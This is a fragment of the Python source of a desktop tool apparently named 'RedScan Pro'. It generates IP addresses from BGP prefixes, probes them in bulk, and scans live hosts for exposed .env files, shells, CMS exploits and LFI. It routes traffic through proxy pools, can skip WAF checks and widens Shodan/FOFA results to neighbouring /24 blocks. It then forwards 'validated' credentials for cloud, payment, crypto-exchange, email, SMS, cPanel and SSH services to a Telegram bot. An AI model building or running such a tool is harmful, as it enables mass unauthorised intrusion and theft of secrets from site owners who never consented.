        if not self._bgp_generator or not self._bgp_generator.loaded:
            messagebox.showwarning("Not Ready", "Load BGP prefixes first (Step ①).")
            return

        threads = int(self._thr_sl.get())
        timeout = int(self._to_sl.get())
        lt      = max(1.5, timeout * 0.4)   # liveness probe = 40% of scan timeout

        # All modules active — no manual path selection needed
        paths = []
        for module_paths in PATH_MODULES.values():
            paths.extend(module_paths)
        paths = list(dict.fromkeys(paths))

        self._reset_cards()
        self._clear_log()
        self._clear_vuln_targets()
        self._progress.set(0)
        self._stat_lbl.configure(text="BGP Scanning…", text_color=C_WARN)
        self._detail_lbl.configure(text="")

        self._bgp_scan_btn.configure(state="disabled", text="Scanning…")
        self._bgp_scan_stop_btn.configure(state="normal")
        self._start_btn.configure(state="disabled")
        self._stop_btn.configure(state="normal")
        self._bgp_targets.clear()
        self._bgp_scan_stop.clear()

        self._log_dim("=" * 68)
        self._log_info(f"[BGP] Pipeline started  ·  {len(paths)} paths  ·  {threads} threads/target  ·  {timeout}s timeout")
        self._log_info(f"[BGP] 300 liveness workers  ·  {lt:.1f}s probe  ·  10 scan workers  ·  runs until stopped")
        self._log_info( "[BGP] Modules: .env / shell / WordPress / Joomla / Laravel / exposure")
        self._log_dim("=" * 68)

        self._rt_email = self._redteam_email.get().strip()
        _save_cfg({'redteam_email': self._rt_email})

        tg_notifier = None
        if self._tg_enabled_cb.get():
            tg_notifier = TelegramNotifier(
                token=self._tg_token.get().strip(),
                chat_id=self._tg_chatid.get().strip(),
                filter_cats=self._get_tg_filter(),
            )
            tg_notifier.send_startup("BGP scan started — continuous mode")
        self._tg_save_config()

        proxies = []
        if self._proxy_enable_cb.get():
            raw_px = self._proxy_box.get("0.0", "end").strip()
            proxies = [l.strip() for l in raw_px.splitlines()
                       if l.strip() and not l.strip().startswith('#')]
            if proxies:
                self._log_info(f"[*] Proxy pool: {len(proxies)} proxies")

        self._scanner = Scanner(
            log_cb=self._log_ts,
            progress_cb=self._on_progress,
            finding_cb=self._on_finding,
            stats_cb=self._on_stats,
            check_services=bool(self._svc_cb.get()),
            telegram=tg_notifier,
            proxies=proxies,
            skip_waf=bool(self._skipwaf_cb.get()),
            redteam_email=self._rt_email,
            js_crawl=bool(self._js_crawl_cb.get()),
            lfi_probe=bool(self._lfi_probe_cb.get()),
            active_checks=bool(self._active_checks_cb.get()),
        )
        self._last_target_count = 0

        threading.Thread(
            target=self._bgp_pipeline_run,
            args=(paths, threads, timeout, lt, tg_notifier),
            daemon=True,
        ).start()

    def _bgp_pipeline_run(self, paths, threads, timeout, lt, tg_notifier):
        """Three-stage parallel pipeline: generate → probe liveness → scan vulns."""
        from concurrent.futures import ThreadPoolExecutor

        raw_q  = _queue.Queue(maxsize=50_000)
        live_q = _queue.Queue(maxsize=10_000)
        stop   = self._bgp_scan_stop
        gen    = self._bgp_generator

        probed  = [0]
        n_live  = [0]
        scanned = [0]
        lock    = threading.Lock()
        # Time-based throttle: log status at most once per second
        _last_log = [0.0]

        # ── Stage 1: Producer — generates IPs from BGP pool indefinitely ─────
        def _producer():
            while not stop.is_set():
                ip = gen.get_next()
                if ip:
                    try:
                        raw_q.put(ip, timeout=0.5)
                    except _queue.Full:
                        pass

        # ── Stage 2: Liveness workers (300) — fast TCP probe ─────────────────
        def _liveness():
            while not stop.is_set():
                try:
                    ip = raw_q.get(timeout=1.0)
                except _queue.Empty:
                    continue
                port = _check_liveness_parallel(ip, (80, 443, 8080, 8443), lt)
                with lock:
                    probed[0] += 1
                    p = probed[0]
                if port:
                    scheme = "https" if port in (443, 8443) else "http"
                    sfx    = "" if port in (80, 443) else f":{port}"
                    url    = f"{scheme}://{ip}{sfx}"
                    with lock:
                        n_live[0] += 1
                        l = n_live[0]
                    # Always log live IPs (there are few of them relative to probed)
                    self._log_ts(f"[BGP] {p:>6,} probed  ·  {l} live  ·  ✓ {url}")
                    gen.record_hit(ip)
                    try:
                        live_q.put(url, timeout=0.5)
                    except _queue.Full:
                        pass
                else:
                    gen.record_scan(ip)
                    # Rate-limit "searching…" status to once per second
                    now = time.time()
                    with lock:
                        if now - _last_log[0] >= 1.0:
                            _last_log[0] = now
                            p_ = probed[0]
                            l_ = n_live[0]
                            self._log_ts(f"[BGP] {p_:>6,} probed  ·  {l_} live  ·  searching…")

        # ── Stage 3: Scan workers (10) — full vuln scan per live IP ──────────
        scanner = self._scanner

        def _scan():
            while not stop.is_set():
                try:
                    url = live_q.get(timeout=1.0)
                except _queue.Empty:
                    continue
                self._bgp_targets.append(url)
                scanner.scan_target(url, paths, threads, timeout)
                with lock:
                    scanned[0] += 1
                    s = scanned[0]
                self._on_progress(s, s + live_q.qsize() + 1)

        # Launch all three stages
        prod = threading.Thread(target=_producer, daemon=True)
        prod.start()

        live_pool = ThreadPoolExecutor(max_workers=300)
        scan_pool = ThreadPoolExecutor(max_workers=10)
        for _ in range(300):
            live_pool.submit(_liveness)
        for _ in range(10):
            scan_pool.submit(_scan)

        # Wait until stop signal
        while not stop.is_set():
            time.sleep(0.5)

        prod.join(timeout=3.0)
        live_pool.shutdown(wait=False, cancel_futures=True)
        scan_pool.shutdown(wait=False, cancel_futures=True)

        found = scanner.found
        self._log_ts("=" * 68)
        self._log_ts(f"[+] [BGP] Done  ·  {scanned[0]:,} scanned  ·  {found} finding(s)")
        if tg_notifier:
            tg_notifier.send_summary(found, scanned[0])
        gen.save_scanned_blocks()
        self.after(0, self._bgp_pipeline_done)

    def _bgp_pipeline_stop(self):
        self._bgp_scan_stop.set()
        if self._scanner:
            self._scanner.stop()
        self._bgp_scan_stop_btn.configure(state="disabled")
        self._bgp_status.configure(text="Stopping…", text_color=C_WARN)

    def _bgp_pipeline_done(self):
        self._bgp_scan_btn.configure(state="normal", text="② START BGP SCAN  ▶")
        self._bgp_scan_stop_btn.configure(state="disabled")
        self._start_btn.configure(state="normal")
        self._stop_btn.configure(state="disabled")
        n = len(self._bgp_targets)
        self._stat_lbl.configure(text="Done", text_color=C_FOUND)
        self._bgp_status.configure(
            text=f"✓ Complete  ·  {n:,} IPs scanned  ·  {self._scanner.found} finding(s)",
            text_color=C_FOUND,
        )
        if n:
            self._bgp_save_btn.configure(state="normal")
        if self._bgp_generator:
            top = self._bgp_generator.get_top_ranges(6)
            if top:
                lines = [f"{b}  ({h} hits)" for b, h in top]
                self._bgp_ranges_box.configure(state="normal")
                self._bgp_ranges_box.delete("0.0", "end")
                self._bgp_ranges_box.insert("0.0", "\n".join(lines))
                self._bgp_ranges_box.configure(state="disabled")

    def _bgp_save_ips(self):
        if not self._bgp_targets:
            from tkinter import messagebox
            messagebox.showinfo("Save IPs", "No BGP targets generated yet.")
            return
        ips_dir = os.path.join(os.path.abspath(RESULTS_DIR), "ips")
        os.makedirs(ips_dir, exist_ok=True)
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(ips_dir, f"bgp_{ts}.txt")
        try:
            with open(path, 'w', encoding='utf-8') as fh:
                fh.write(f"# BGP Live IP Pool — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                fh.write(f"# Total: {len(self._bgp_targets)}\n\n")
                for t in self._bgp_targets:
                    fh.write(t + "\n")
            from tkinter import messagebox
            messagebox.showinfo("Saved", f"Saved {len(self._bgp_targets):,} IPs to:\n{path}")
        except Exception as e:
            from tkinter import messagebox
            messagebox.showerror("Error", str(e))

    # ══════════════════════════════════════════════════════════════════════════
    # BGP /24 NEIGHBOUR EXPANSION  (for Shodan / FOFA results)
    # ══════════════════════════════════════════════════════════════════════════

    def _expand_pool(self, source: str):
        if not self._osint_targets:
            from tkinter import messagebox
            messagebox.showinfo("Expand", "Fetch targets first.")
            return

        expand_btn = self._sh_expand_btn if source == 'shodan' else self._fo_expand_btn
        status_lbl = self._sh_status     if source == 'shodan' else self._fo_status

        expand_btn.configure(state="disabled", text="Expanding…")
        status_lbl.configure(text="Probing /24 neighbours…", text_color=C_WARN)
        self._log_info(f"[BGP-Expand] Expanding {len(self._osint_targets)} {source.upper()} targets with /24 neighbours…")

        base = list(self._osint_targets)
        self._bgp_expand_stop.clear()

        def _run():
            expanded = bgp_expand_targets(
                base_urls=base,
                extra_per_block=10,
                liveness_timeout=3.0,
                stop_evt=self._bgp_expand_stop,
                log_cb=self._log_ts,
            )
            self._osint_targets = expanded
            added = len(expanded) - len(base)
            self.after(0, lambda: self._bgp_expand_done(source, expanded, added))

        threading.Thread(target=_run, daemon=True).start()

    def _bgp_expand_done(self, source: str, expanded: list[str], added: int):
        expand_btn = self._sh_expand_btn if source == 'shodan' else self._fo_expand_btn
        status_lbl = self._sh_status     if source == 'shodan' else self._fo_status
        expand_btn.configure(state="normal", text="🔗 Expand /24 Neighbours")
        status_lbl.configure(
            text=f"✓ {len(expanded):,} targets  (+{added} neighbours added)",
            text_color=C_FOUND,
        )
        self._log_found(f"[BGP-Expand] +{added} live neighbours — total pool: {len(expanded):,}")

    # ══════════════════════════════════════════════════════════════════════════
    # TELEGRAM CONFIG SECTION
    # ══════════════════════════════════════════════════════════════════════════

    def _build_telegram_section(self, parent):
        _sec(parent, "TELEGRAM ALERTS")
        tg = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)
        tg.pack(fill="x", padx=14, pady=(0, 8))
        cfg = self._cfg

        # ── Bot token ─────────────────────────────────────────────────────────
        _sec(tg, "BOT TOKEN")
        tk_row = ctk.CTkFrame(tg, fg_color="transparent")
        tk_row.pack(fill="x", padx=10, pady=(0, 6))
        self._tg_token = ctk.CTkEntry(
            tk_row, placeholder_text="123456:AABBcc…",
            show="•", fg_color=BG_INP, height=30,
            font=ctk.CTkFont(size=11),
        )
        self._tg_token.pack(side="left", fill="x", expand=True)
        if cfg.get("tg_token"):
            self._tg_token.insert(0, cfg["tg_token"])
        ctk.CTkButton(
            tk_row, text="Show", width=46, height=30,
            fg_color="#12273d", hover_color="#1a3654",
            font=ctk.CTkFont(size=10),
            command=lambda: self._tg_token.configure(
                show="" if self._tg_token.cget("show") == "•" else "•"
            ),
        ).pack(side="right", padx=(4, 0))

        # ── Chat ID ───────────────────────────────────────────────────────────
        _sec(tg, "CHAT ID")
        self._tg_chatid = ctk.CTkEntry(
            tg, placeholder_text="-100123456789",
            fg_color=BG_INP, height=30,
            font=ctk.CTkFont(size=11),
        )
        self._tg_chatid.pack(fill="x", padx=10, pady=(0, 6))
        if cfg.get("tg_chatid"):
            self._tg_chatid.insert(0, cfg["tg_chatid"])

        # ── Category picker ───────────────────────────────────────────────────
        _sec(tg, "ALERT CATEGORIES  (only validated ✓ findings are ever sent)")

        # Quick-select row
        qs = ctk.CTkFrame(tg, fg_color="transparent")
        qs.pack(fill="x", padx=10, pady=(0, 4))
        ctk.CTkButton(qs, text="All", width=48, height=22,
                      fg_color="#12273d", hover_color="#1a3654",
                      font=ctk.CTkFont(size=10),
                      command=lambda: self._tg_cat_select_all(True),
                      ).pack(side="left", padx=(0, 4))
        ctk.CTkButton(qs, text="None", width=48, height=22,
                      fg_color="#1c1010", hover_color="#2e1515",
                      font=ctk.CTkFont(size=10),
                      command=lambda: self._tg_cat_select_all(False),
                      ).pack(side="left")
        ctk.CTkLabel(qs, text="Only ✓ validated credentials are sent",
                     font=ctk.CTkFont(size=9), text_color="#4b5563",
                     ).pack(side="right")

        # Scrollable category checkboxes — grouped
        cat_scroll = ctk.CTkScrollableFrame(tg, height=160, fg_color=BG_INP,
                                             corner_radius=6,
                                             scrollbar_button_color="#1e3a5f")
        cat_scroll.pack(fill="x", padx=10, pady=(0, 6))

        self._tg_cat_cbs: dict[str, ctk.CTkCheckBox] = {}
        saved_filter = cfg.get("tg_filter", "ALL")
        # ALL means every box was checked; otherwise parse comma list
        saved_set = None if saved_filter == "ALL" else {
            c.strip().lower() for c in saved_filter.split(",") if c.strip()
        }

        _CAT_GROUPS = [
            ("💰  Payment / Cloud",   ["aws", "stripe", "shopify", "binance", "coinbase", "paxful", "api_keys", "db"]),
            ("📧  Email Providers",   ["mail", "mailgun", "sendgrid", "postmark", "brevo", "sparkpost", "mandrill", "mailjet", "elasticemail"]),
            ("📱  SMS / Voice",       ["twilio", "plivo", "nexmo", "messagebird", "sinch", "telnyx", "bandwidth", "africas_talking", "bulksms", "clicksend", "telesign", "sms_api"]),
            ("🌐  CMS / Web",         ["wordpress", "wp_exploits", "joomla", "laravel"]),
            ("🔐  Services / Access", ["shell", "cpanel", "whm", "plesk", "ftp", "ssh"]),
        ]
        for group_label, keys in _CAT_GROUPS:
            ctk.CTkLabel(cat_scroll, text=group_label,
                         font=ctk.CTkFont(size=9, weight="bold"),
                         text_color=A).pack(anchor="w", padx=6, pady=(6, 1))
            row_frm = ctk.CTkFrame(cat_scroll, fg_color="transparent")
            row_frm.pack(fill="x", padx=4, pady=(0, 2))
            for col, key in enumerate(keys):
                # Human label: use FINDING_META label if available
                label = next((lbl for k, lbl, _ in FINDING_META if k == key), key.upper())
                should_check = (saved_set is None) or (key in saved_set)
                cb = ctk.CTkCheckBox(
                    row_frm, text=label,
                    font=ctk.CTkFont(size=10),
                    checkmark_color=BG_APP, fg_color=A, hover_color="#00aed4",
                    width=110,
                )
                cb.grid(row=col // 3, column=col % 3, sticky="w", padx=2, pady=1)
                row_frm.grid_columnconfigure(col % 3, weight=1)
                if should_check:
                    cb.select()
                self._tg_cat_cbs[key] = cb

        # ── Enable toggle + Test + Save buttons ──────────────────────────────
        bot_row = ctk.CTkFrame(tg, fg_color="transparent")
        bot_row.pack(fill="x", padx=10, pady=(0, 4))
        self._tg_enabled_cb = ctk.CTkCheckBox(
            bot_row, text="Enable Telegram alerts",
            font=ctk.CTkFont(size=11),
            checkmark_color=BG_APP, fg_color=A, hover_color="#00aed4",
            command=self._tg_save_config,
        )
        self._tg_enabled_cb.pack(side="left")
        if cfg.get("tg_enabled"):
            self._tg_enabled_cb.select()

        btn_row = ctk.CTkFrame(tg, fg_color="transparent")
        btn_row.pack(fill="x", padx=10, pady=(0, 10))
        ctk.CTkButton(
            btn_row, text="💾 Save Config", width=90, height=28,
            fg_color="#14532d", hover_color="#166534",
            font=ctk.CTkFont(size=10),
            command=self._tg_save_config,
        ).pack(side="left", padx=(0, 4))
        ctk.CTkButton(
            btn_row, text="Test Bot", width=72, height=28,
            fg_color="#12273d", hover_color="#1a3654",
            font=ctk.CTkFont(size=10),
            command=self._tg_test,
        ).pack(side="right")

    def _get_tg_filter(self) -> str:
        """Return comma-separated selected categories, or 'ALL' if everything is checked."""
        selected = [k for k, cb in self._tg_cat_cbs.items() if cb.get()]
        all_keys = list(self._tg_cat_cbs.keys())
        if len(selected) == len(all_keys):
            return "ALL"
        return ",".join(selected) if selected else "NONE"

    def _tg_cat_select_all(self, state: bool):
        for cb in self._tg_cat_cbs.values():
            cb.select() if state else cb.deselect()

    def _tg_save_config(self):
        _save_cfg({
            'tg_token':   self._tg_token.get().strip(),
            'tg_chatid':  self._tg_chatid.get().strip(),
            'tg_filter':  self._get_tg_filter(),
            'tg_enabled': bool(self._tg_enabled_cb.get()),
        })

    def _tg_test(self):
        self._tg_save_config()   # auto-save on test
        notifier = TelegramNotifier(
            token=self._tg_token.get().strip(),
            chat_id=self._tg_chatid.get().strip(),
        )
        ok, msg = notifier.test_connection()
        from tkinter import messagebox
        if ok:
            notifier.send_message("✅ <b>RedScan Pro</b> — Telegram test OK")
            messagebox.showinfo("Telegram", f"Connected as {msg}")
        else:
            messagebox.showerror("Telegram", f"Connection failed:\n{msg}")


# ── Entry ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app = SBScanner()
    app.mainloop()
